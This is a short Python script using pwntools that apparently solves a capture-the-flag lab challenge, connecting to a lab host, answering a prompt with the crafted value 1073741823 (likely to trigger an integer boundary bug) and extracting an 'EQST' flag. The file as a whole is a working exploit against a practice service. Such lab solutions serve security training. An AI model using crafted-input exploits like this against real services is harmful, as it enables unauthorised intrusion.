import re
from pwn import context, remote

def get_flag(data: str, prefix: str) -> str:
    return next(iter(re.findall(rf"{prefix}\{{.*?\}}", data)), "")

def solution(host: str, port: str, prefix: str) -> str:
    context.update({"log_level":"error"})
    with remote(host, port) as rem:
        rem.sendlineafter(b"What is your number? \n", b"1073741823")
        flag = get_flag(rem.recv().strip().decode(), prefix)
    return flag

if __name__ == "__main__":
    host = "lab.eqst.co.kr"
    port = "8160"
    prefix = "EQST"
    print(solution(host, port, prefix))
    